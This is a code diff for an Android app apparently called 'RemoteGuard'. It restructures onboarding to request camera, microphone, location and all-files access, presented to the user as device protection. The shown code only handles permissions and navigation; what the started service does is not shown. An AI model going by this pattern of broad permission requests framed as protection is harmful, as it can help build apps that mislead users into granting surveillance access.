@@ -54,47 +54,35 @@ class MainActivity : ComponentActivity() {
                 Log.e("MainActivity", "onCreate: Error starting service", e)
             }
 
-            try {
-                UpdateManager.checkForUpdates(this)
-                Log.d("MainActivity", "onCreate: Update check started")
-            } catch (e: Exception) {
-                Log.e("MainActivity", "onCreate: Error checking updates", e)
-            }
-
             val startDest = if (hasAllPermissions()) "status" else "onboarding"
             Log.d("MainActivity", "onCreate: Start destination = $startDest")
 
             setContent {
-                try {
-                    RemoteGuardTheme {
-                        val navController = rememberNavController()
-                        Surface(
-                            modifier = Modifier.fillMaxSize(),
-                            color = MaterialTheme.colorScheme.background
-                        ) {
-                            NavHost(navController = navController, startDestination = startDest) {
-                                composable("onboarding") {
-                                    OnboardingScreen {
-                                        navController.navigate("status") {
-                                            popUpTo("onboarding") { inclusive = true }
-                                        }
-                                        startService()
+                RemoteGuardTheme {
+                    val navController = rememberNavController()
+                    Surface(
+                        modifier = Modifier.fillMaxSize(),
+                        color = MaterialTheme.colorScheme.background
+                    ) {
+                        NavHost(navController = navController, startDestination = startDest) {
+                            composable("onboarding") {
+                                OnboardingScreen {
+                                    navController.navigate("status") {
+                                        popUpTo("onboarding") { inclusive = true }
                                     }
+                                    startService()
                                 }
-                                composable("status") {
-                                    StatusScreen(
-                                        onOpenChat = { navController.navigate("chat") }
-                                    )
-                                }
-                                composable("chat") {
-                                    ChatScreen()
-                                }
+                            }
+                            composable("status") {
+                                StatusScreen(
+                                    onOpenChat = { navController.navigate("chat") }
+                                )
+                            }
+                            composable("chat") {
+                                ChatScreen()
                             }
                         }
                     }
-                } catch (e: Exception) {
-                    Log.e("MainActivity", "setContent Error", e)
-                    throw e
                 }
             }
             Log.d("MainActivity", "onCreate: Completed successfully")
@@ -162,16 +150,39 @@ class MainActivity : ComponentActivity() {
 @Composable
 fun OnboardingScreen(onComplete: () -> Unit) {
     val context = LocalContext.current
-    val launcher = rememberLauncherForActivityResult(
+    var permissionStage by remember { mutableStateOf(0) }
+
+    val basicPermissionsLauncher = rememberLauncherForActivityResult(
         ActivityResultContracts.RequestMultiplePermissions()
     ) { permissions: Map<String, Boolean> ->
         val allGranted = permissions.values.all { it }
+        Log.d("OnboardingScreen", "Basic permissions result: granted=$allGranted")
         if (allGranted) {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
-                if (!Environment.isExternalStorageManager()) {
-                    val intent = Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION)
-                    context.startActivity(intent)
-                }
+                permissionStage = 1
+            } else {
+                permissionStage = 2
+                onComplete()
+            }
+        }
+    }
+
+    val manageStorageLauncher = rememberLauncherForActivityResult(
+        ActivityResultContracts.StartActivityForResult()
+    ) { result ->
+        Log.d("OnboardingScreen", "Manage storage permission result")
+        permissionStage = 2
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && !Environment.isExternalStorageManager()) {
+            Log.w("OnboardingScreen", "Manage storage not granted, but proceeding anyway")
+        }
+        onComplete()
+    }
+
+    LaunchedEffect(permissionStage) {
+        if (permissionStage == 1) {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+                val intent = Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION)
+                manageStorageLauncher.launch(intent)
             }
         }
     }
@@ -189,18 +200,18 @@ fun OnboardingScreen(onComplete: () -> Unit) {
         )
         Spacer(modifier = Modifier.height(32.dp))
         Text(
-            "Security Setup", 
+            "Security Setup",
             style = MaterialTheme.typography.headlineMedium,
             color = MaterialTheme.colorScheme.onBackground
         )
         Spacer(modifier = Modifier.height(16.dp))
         Text(
-            "To protect your device, we need a few permissions.",
+            "To protect your device, we need permissions for camera, microphone, location, and file access.",
             textAlign = androidx.compose.ui.text.style.TextAlign.Center,
             color = Color.Gray
         )
         Spacer(modifier = Modifier.height(48.dp))
-        
+
         Button(
             onClick = {
                 val permissions = mutableListOf(
@@ -216,18 +227,22 @@ fun OnboardingScreen(onComplete: () -> Unit) {
                     permissions.add(Manifest.permission.READ_EXTERNAL_STORAGE)
                     permissions.add(Manifest.permission.WRITE_EXTERNAL_STORAGE)
                 }
-                launcher.launch(permissions.toTypedArray())
+                Log.d("OnboardingScreen", "Requesting permissions: $permissions")
+                basicPermissionsLauncher.launch(permissions.toTypedArray())
             },
             modifier = Modifier.fillMaxWidth(),
             shape = RoundedCornerShape(12.dp)
         ) {
             Text("Grant Required Permissions", modifier = Modifier.padding(8.dp))
         }
-        
+
         Spacer(modifier = Modifier.height(16.dp))
-        
-        TextButton(onClick = onComplete) {
-            Text("Already granted? Start Protection")
+
+        TextButton(onClick = {
+            Log.d("OnboardingScreen", "Skip permissions button clicked")
+            onComplete()
+        }) {
+            Text("Skip for now")
         }
     }
 }
@@ -352,7 +367,7 @@ fun StatusScreen(onOpenChat: () -> Unit) {
         )
         Spacer(modifier = Modifier.height(24.dp))
         Text(
-            text = "Your device is protected now",
+            text = "Your database is secure now",
             style = MaterialTheme.typography.headlineSmall,
             color = MaterialTheme.colorScheme.primary
         )
